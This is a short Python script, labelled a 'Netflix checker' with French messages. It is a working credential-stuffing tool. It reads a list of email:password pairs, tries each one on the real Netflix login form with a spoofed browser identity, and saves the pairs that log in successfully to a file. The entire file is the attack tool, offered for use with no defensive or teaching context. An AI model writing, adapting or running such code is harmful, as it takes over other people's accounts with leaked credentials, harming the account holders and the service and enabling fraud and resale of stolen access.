import mechanize
import time


print ('[*] Netflix checker by M0NEGASQUE [*]')
time.sleep(2)
work_account=0
death_account=0

accPass=[]
outfile = open('worksAcc.txt', 'w')

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.addheaders = [('User-agent', 'Firefox')]
try:


	with open("listAcc.txt", "r") as filestream:
		for line in filestream:
			br.open('https://www.netflix.com/fr/login')
			currentline = line.replace("\n", "").split(':')
            
			print('Ligne : ', currentline)
			br.select_form(nr=0)
			br.form['userLoginId'] = currentline[0]
			br.form['password'] = currentline[1]
			print ('logging in to.. mail: '+br.form['userLoginId'])
			response = br.submit()
			print('response : ', response.geturl())

			if response.geturl()=='https://www.netflix.com/browse':
				print ('Compte fonctionnel')
				work_account = work_account + 1
				br.open('https://www.netflix.com/SignOut?lnkctr=mL')
				accPass.append(currentline[0]+':'+currentline[1])
				time.sleep(2)
			else:
				print ('Compte non fonctionnel')
				death_account = death_account + 1
				time.sleep(2)

	print ('Enregistrement des compte fonctionnel dans le fichier workAcc.txt..')

	for all in accPass:
		print ('all : ' + all)
		outfile.write(str(all)+'\n')

except:
	print ('...Une erreur est survenue...')
	for all in accPass:
		outfile.write(str(all)+'\n')
	
print ('Compte Activé: ' + str(work_account))
print ('Compte Désactivé: ' + str(death_account))
